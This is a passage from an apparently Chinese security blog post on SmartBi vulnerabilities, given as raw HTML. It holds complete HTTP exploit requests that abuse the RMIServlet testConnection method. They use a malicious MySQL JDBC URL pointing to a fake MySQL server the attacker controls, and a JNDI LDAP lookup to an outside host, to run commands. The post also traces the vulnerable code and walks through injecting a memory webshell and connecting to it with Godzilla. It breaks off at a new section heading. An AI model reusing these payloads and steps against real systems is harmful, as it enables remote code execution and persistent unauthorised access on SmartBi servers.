class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">POST</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/smartbi/vision/RMIServlet</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">HTTP/1.1</span></span><span class="line"><span style="color: #61AFEF">Host:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">192.168</span><span style="color: #98C379">.1.8:18080</span></span><span class="line"><span style="color: #61AFEF">User-Agent:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Mozilla/5.0</span><span style="color: #ABB2BF"> (Windows </span><span style="color: #98C379">NT</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">10.0</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">Win64</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">x64</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">rv:136.0</span><span style="color: #ABB2BF">) Gecko/20100101 Firefox/136.0</span></span><span class="line"><span style="color: #61AFEF">Accept:</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">*</span><span style="color: #98C379">/</span><span style="color: #E5C07B">*</span></span><span class="line"><span style="color: #61AFEF">Accept-Language:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">zh-CN,zh</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.8</span><span style="color: #98C379">,zh-TW</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.7</span><span style="color: #98C379">,zh-HK</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.5</span><span style="color: #98C379">,en-US</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.3</span><span style="color: #98C379">,en</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.2</span></span><span class="line"><span style="color: #61AFEF">Accept-Encoding:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">gzip,</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">deflate,</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">br</span></span><span class="line"><span style="color: #61AFEF">If-Modified-Since:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span></span><span class="line"><span style="color: #61AFEF">Content-Type:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">application/x-www-form-urlencoded</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">charset</span><span style="color: #56B6C2">=</span><span style="color: #98C379">UTF-8</span></span><span class="line"><span style="color: #61AFEF">Content-Length:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">69</span></span><span class="line"><span style="color: #61AFEF">Origin:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">http://192.168.1.8:18080</span></span><span class="line"><span style="color: #61AFEF">Connection:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">keep-alive</span></span><span class="line"><span style="color: #61AFEF">Referer:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">http://192.168.1.8:18080/smartbi/vision/index.jsp</span></span><span class="line"><span style="color: #61AFEF">Cookie:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">JSESSIONID=E5045F082547A15B8646D2E018EB591A</span></span><span class="line"><span style="color: #61AFEF">Priority:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">u=</span><span style="color: #D19A66">0</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">className</span><span style="color: #56B6C2">=</span><span style="color: #98C379">DataSourceService</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">methodName</span><span style="color: #56B6C2">=</span><span style="color: #98C379">testConnection</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">params</span><span style="color: #56B6C2">=</span><span style="color: #98C379">[{&quot;password&quot;%</span></span><span class="line"><span style="color: #61AFEF">3a</span><span style="color: #61AFEF">&quot;&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;maxConnection&quot;</span><span style="color: #61AFEF">%3a100,</span><span style="color: #61AFEF">&quot;user&quot;</span><span style="color: #61AFEF">%3a</span><span style="color: #61AFEF">&quot;&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;driverType&quot;</span><span style="color: #61AFEF">%3a</span><span style="color: #61AFEF">&quot;MYSQL&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;validationQ</span></span><span class="line"><span style="color: #61AFEF">uery&quot;</span><span style="color: #61AFEF">%3a</span><span style="color: #61AFEF">&quot;SELECT+1+FROM+DUAL&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;url&quot;</span><span style="color: #61AFEF">%3a</span><span style="color: #61AFEF">&quot;jdbc%3amysql%3a//xxxx.xxx.xxx.xxx%3a</span></span><span class="line"><span style="color: #61AFEF">3308/d9f8b01%3fautoDeserialize%3dtrue%26statementInterceptors%3dcom.mysql.</span></span><span class="line"><span style="color: #61AFEF">jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;name&quot;</span><span style="color: #61AFEF">%3a</span><span style="color: #61AFEF">&quot;JDBC&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;driver&quot;</span><span style="color: #61AFEF">%3</span></span><span class="line"><span style="color: #61AFEF">a</span><span style="color: #61AFEF">&quot;com.mysql.jdbc.Driver&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;id&quot;</span><span style="color: #61AFEF">%3a</span><span style="color: #61AFEF">&quot;&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;desc&quot;</span><span style="color: #61AFEF">%3a</span><span style="color: #61AFEF">&quot;&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;alias&quot;</span><span style="color: #61AFEF">%3a</span><span style="color: #61AFEF">&quot;&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;dbCharset&quot;</span><span style="color: #61AFEF">%3</span></span><span class="line"><span style="color: #61AFEF">a</span><span style="color: #61AFEF">&quot;&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;identifierQuoteString&quot;</span><span style="color: #61AFEF">%3a</span><span style="color: #61AFEF">&quot;</span><span style="color: #98C379">`</span><span style="color: #61AFEF">&quot;,&quot;transactionIsolation&quot;%3a-1,&quot;validationQ</span></span><span class="line"><span style="color: #61AFEF">ueryMethod&quot;%3a0,&quot;dbToCharset&quot;%3a&quot;&quot;,&quot;authenticationType&quot;%3a&quot;STATIC&quot;}]</span></span></code></pre></div></div></figure><p>弹出计算器</p><p>首先搭建在公⽹VPS上搭建FakeMysql服务器</p><p>发送数据包后，我们的smartBi服务器尝试连接fakeMysql服务器，通过反序列化即可成功执⾏命令</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173447060.png" alt="image-20250812181350575"></p><h4 id="漏洞分析：-2"><a href="#漏洞分析：-2" class="headerlink" title="漏洞分析："></a><strong>漏洞分析：</strong></h4><ol><li><p>通过查找SmartBi的Jar包，发现 mysql-connector-java 的依赖版本为5.1.44，是存在JDBC反序列 化漏洞的版本</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173448639.png" alt="image-20250812181512068"></p></li><li><p>需要找到⼀个发序列化链</p><p>pom.xml中，发现 common-collections 依赖，版本 3.2.1 ，存在CC反序列化</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173450003.png" alt="image-20250812182127446"></p></li><li><p>配置payload时，配置K1链⼦，⽣成payload即可</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173451624.png" alt="image-20250812182159537"></p></li><li><p>漏洞产⽣点在 DataSourceService 中的 testConnection 中</p><figure class="shiki Java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre><code>public void testConnection(IDataSource dataSource) {       MetaDataServiceImpl.getInstance().testConnection(dataSource);   }</code></pre></div></div></figure></li><li><p>正常调⽤会⾛到 MetaDataServiceImpl 的 testConnection 中，执⾏该语句，服务器就会向远 程FakeMysql尝试连接，就会接收到FakeMysql返回的恶意序列化数据，在反序列化过程中，就会触发我 们所构造的payload</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173454054.png" alt="image-20250812182609648"></p></li><li><p>要调⽤ DataSourceService 的 testConnection ⽅法，我们可以通过 &#x2F;vision&#x2F;RMIServle t 的反射调⽤某类的某⽅法进⾏调⽤，构造payload如下（在POST数据包中，需要进⾏⼀次URL编码， 否则会报错）</p></li></ol><p>在进⾏⽅法调⽤时，会将我们传⼊的字符串类型参数 params ，转换成⼀个JsonArray类型的参数</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173457556.png" alt="image-20250812182902720"></p><p>步⼊ execute ⽅法中，以下部分代码，可以将JSON对象转化成Object对象</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173458919.png" alt="image-20250812182957914"></p><p>然后将var5对象传⼊ testConnection ⽅法中</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">void</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">testConnection</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">IDataSource</span><span style="color: #E06C75"> dataSource) {</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">MetaDataServiceImpl</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInstance</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">testConnection</span><span style="color: #ABB2BF">(dataSource);</span></span><span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure><p>再进⼀步，会将dataSource中存储的信息⼀⼀拿出，⽤于后续的数据源连接</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">void</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">testConnection</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">IDataSource</span><span style="color: #E06C75"> dataSource) {</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">DataSource</span><span style="color: #E06C75"> ds </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">DataSource</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">ds</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setId</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">UUIDGenerator</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">generate</span><span style="color: #ABB2BF">());</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">ds</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setName</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">dataSource</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getName</span><span style="color: #ABB2BF">());</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">ds</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAlias</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">dataSource</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getAlias</span><span style="color: #ABB2BF">());</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">ds</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setDriver</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">dataSource</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDriver</span><span style="color: #ABB2BF">());</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">ds</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setDesc</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">dataSource</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDesc</span><span style="color: #ABB2BF">());</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">ds</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setDbCharset</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">dataSource</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDbCharset</span><span style="color: #ABB2BF">());</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">ds</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setUrl</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">dataSource</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getUrl</span><span style="color: #ABB2BF">());</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">ds</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setUser</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">dataSource</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getUser</span><span style="color: #ABB2BF">());</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">ds</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setDriverType</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">dataSource</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDriverType</span><span style="color: #ABB2BF">());</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">ds</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setMaxConnection</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">dataSource</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getMaxConnection</span><span style="color: #ABB2BF">());</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">ds</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setValidationQuery</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">dataSource</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getValidationQuery</span><span style="color: #ABB2BF">());</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">ds</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setPassword</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">dataSource</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getPassword</span><span style="color: #ABB2BF">());</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">ds</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setTransactionIsolation</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">dataSource</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getTransactionIsolation</span><span style="color: #ABB2BF">());</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">ds</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setValidationQueryMethod</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">dataSource</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getValidationQueryMethod</span><span style="color: #ABB2BF">());</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">ds</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAuthenticationType</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">dataSource</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getAuthenticationType</span><span style="color: #ABB2BF">());</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">dataSource</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getPassword</span><span style="color: #ABB2BF">()</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">==</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">!</span><span style="color: #E5C07B">StringUtil</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">isNullOrEmpty</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">dataSource</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getId</span><span style="color: #ABB2BF">())</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">           </span><span style="color: #E5C07B">DataSource</span><span style="color: #E06C75"> dbDs </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">FreeQueryDAOFactory</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDataSourceDAO</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">load</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">dataSource</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getId</span><span style="color: #ABB2BF">());</span></span><span class="line"><span style="color: #E06C75">           </span><span style="color: #E5C07B">ds</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setPassword</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">dbDs</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getPassword</span><span style="color: #ABB2BF">());</span></span><span class="line"><span style="color: #E06C75">       }</span></span></code></pre></div></div></figure><h4 id="内存马："><a href="#内存马：" class="headerlink" title="内存马："></a>内存马：</h4><ol><li><p>配置好⼯具类型、中间件、内存⻢类型、密码等信息，点击⽣成class⽂件</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173501931.png" alt="image-20250812183232630"></p></li><li><p>使⽤javaChains⼯具进⾏注⼊，选择⾃定义字节码，将我们⽣成的class⽂件上传上去</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173504653.png" alt="image-20250812183305769"></p></li><li><p>⽤我们的Poc将内存⻢注⼊进去</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173506011.png" alt="image-20250812183343304"></p></li><li><p>配置哥斯拉密码密钥信息，同时设置请求配置（与内存⻢设置请求头⼀样）</p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173507432.png" alt="image-20250812183359493" style="zoom:50%;" /><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173509318.png" alt="image-20250812183413264" style="zoom:50%;" /></li><li><p>可以看到成功连接并执⾏命令</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173511109.png" alt="image-20250812183434734"></p></li></ol><h2 id="SmartBi-JNDI注⼊"><a href="#SmartBi-JNDI注⼊" class="headerlink" title="SmartBi-JNDI注⼊"></a>SmartBi-JNDI注⼊</h2><h4 id="payload：-3"><a href="#payload：-3" class="headerlink" title="payload："></a><strong>payload：</strong></h4><figure class="shiki shell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">POST</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/smartbi/vision/RMIServlet</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">HTTP/1.1</span></span><span class="line"><span style="color: #61AFEF">Host:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">192.168</span><span style="color: #98C379">.1.8:18080</span></span><span class="line"><span style="color: #61AFEF">User-Agent:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Mozilla/5.0</span><span style="color: #ABB2BF"> (Windows </span><span style="color: #98C379">NT</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">10.0</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">Win64</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">x64</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">rv:136.0</span><span style="color: #ABB2BF">) Gecko/20100101 Firefox/136.0</span></span><span class="line"><span style="color: #61AFEF">Accept:</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">*</span><span style="color: #98C379">/</span><span style="color: #E5C07B">*</span></span><span class="line"><span style="color: #61AFEF">Accept-Language:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">zh-CN,zh</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.8</span><span style="color: #98C379">,zh-TW</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.7</span><span style="color: #98C379">,zh-HK</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.5</span><span style="color: #98C379">,en-US</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.3</span><span style="color: #98C379">,en</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.2</span></span><span class="line"><span style="color: #61AFEF">Accept-Encoding:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">gzip,</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">deflate,</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">br</span></span><span class="line"><span style="color: #61AFEF">If-Modified-Since:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span></span><span class="line"><span style="color: #61AFEF">Content-Type:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">application/x-www-form-urlencoded</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">charset</span><span style="color: #56B6C2">=</span><span style="color: #98C379">UTF-8</span></span><span class="line"><span style="color: #61AFEF">Content-Length:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">483</span></span><span class="line"><span style="color: #61AFEF">Origin:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">http://192.168.1.8:18080</span></span><span class="line"><span style="color: #61AFEF">Connection:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">keep-alive</span></span><span class="line"><span style="color: #61AFEF">Referer:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">http://192.168.1.8:18080/smartbi/vision/index.jsp</span></span><span class="line"><span style="color: #61AFEF">Cookie:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">JSESSIONID=E5045F082547A15B8646D2E018EB591A</span></span><span class="line"><span style="color: #61AFEF">Priority:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">u=</span><span style="color: #D19A66">0</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">className</span><span style="color: #56B6C2">=</span><span style="color: #98C379">DataSourceService</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">methodName</span><span style="color: #56B6C2">=</span><span style="color: #98C379">testConnection</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">params</span><span style="color: #56B6C2">=</span><span style="color: #98C379">[{&quot;password&quot;%</span></span><span class="line"><span style="color: #61AFEF">3a</span><span style="color: #61AFEF">&quot;&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;maxConnection&quot;</span><span style="color: #61AFEF">%3a100,</span><span style="color: #61AFEF">&quot;user&quot;</span><span style="color: #61AFEF">%3a</span><span style="color: #61AFEF">&quot;&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;driverType&quot;</span><span style="color: #61AFEF">%3a</span><span style="color: #61AFEF">&quot;MYSQL&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;validationQ</span></span><span class="line"><span style="color: #61AFEF">uery&quot;</span><span style="color: #61AFEF">%3a</span><span style="color: #61AFEF">&quot;SELECT+1+FROM+DUAL&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;url&quot;</span><span style="color: #61AFEF">%3a</span><span style="color: #61AFEF">&quot;JNDI:ldap://xxxx.xxx.xxx.xxx:50389/0</span></span><span class="line"><span style="color: #61AFEF">7e967&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;name&quot;</span><span style="color: #61AFEF">%3a</span><span style="color: #61AFEF">&quot;JDBC&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;driver&quot;</span><span style="color: #61AFEF">%3a</span><span style="color: #61AFEF">&quot;com.mysql.jdbc.Driver&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;id&quot;</span><span style="color: #61AFEF">%3a</span><span style="color: #61AFEF">&quot;&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;des</span></span><span class="line"><span style="color: #61AFEF">c&quot;</span><span style="color: #61AFEF">%3a</span><span style="color: #61AFEF">&quot;&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;alias&quot;</span><span style="color: #61AFEF">%3a</span><span style="color: #61AFEF">&quot;&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;dbCharset&quot;</span><span style="color: #61AFEF">%3a</span><span style="color: #61AFEF">&quot;&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;identifierQuoteString&quot;</span><span style="color: #61AFEF">%3a</span><span style="color: #61AFEF">&quot;</span><span style="color: #98C379">`</span><span style="color: #61AFEF">&quot;,&quot;trans</span></span><span class="line"><span style="color: #61AFEF">actionIsolation&quot;%3a-1,&quot;validationQueryMethod&quot;%3a0,&quot;dbToCharset&quot;%3a&quot;&quot;,&quot;auth</span></span><span class="line"><span style="color: #61AFEF">enticationType&quot;%3a&quot;STATIC&quot;}]</span></span></code></pre></div></div></figure><p>使⽤JavaChains⽣成Payload</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173514363.png" alt="image-20250812183630155"></p><p>发送数据包成功执⾏命令，弹出计算器</p><h4 id="漏洞分析：-3"><a href="#漏洞分析：-3" class="headerlink" title="漏洞分析："></a><strong>漏洞分析：</strong></h4><ol><li><p>漏洞点同上</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173600292.png" alt="image-20250812183759234"></p></li><li><p>⾛⼊ ConnectionPool 的 getConnection ⽅法⾥，有这么⼀个判断，如果获取的URL是以 JDN I: 开头，就会将 JNDI: 截取，对剩下的部分调⽤ lookup() </p><p><img src="C:\Users\95227\Desktop\image-20250812184549730.png" alt="image-20250812184549730"></p></li><li><p>⽣成payload JNDI:ldap:&#x2F;&#x2F;xxxx.xxx.xxx.xxx:50389&#x2F;07e967</p></li></ol><h4 id="内存马：-1"><a href="#内存马：-1" class="headerlink" title="内存马："></a>内存马：</h4><ol><li><p>内存⻢可以使⽤JavaChains进⾏注⼊，选择调⽤Jmg⽣成注⼊内存⻢</p><p>（配置内存⻢的⼯具种类、内存⻢类型、中间件类型等等，然后点击⽣成）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173517313.png" alt="image-20250812184700407"></p></li><li><p>发送Payload进⾏注⼊内存⻢</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173518704.png" alt="image-20250812184730041"></p></li><li><p>打开哥斯拉，配置⽬标信息</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173520026.png" alt="image-20250812184746918"></p></li><li><p>记住根据配置的请求头，在哥斯拉中设置请求配置</p><p><img src="C:\Users\95227\AppData\Roaming\Typora\typora-user-images\image-20250812184756424.png" alt="image-20250812184756424"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173521845.png" alt="image-20250812184804807"></p></li><li><p>可以看到内存⻢注⼊成功，可以连接并进⾏命令执⾏</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173527813.png" alt="image-20250812184820515"></p></li></ol><h2 id="前台JDBC反序列化"><a href="#前台JDBC反序列化" class="headerlink" title="前台JDBC反序列化"></a>前台JDBC反序列化</h2><h4 id="payload：-4"><a href="#payload：-4" class="headerlink" title="payload："></a><strong>payload：</strong></h4><figure class="shiki shell"><div 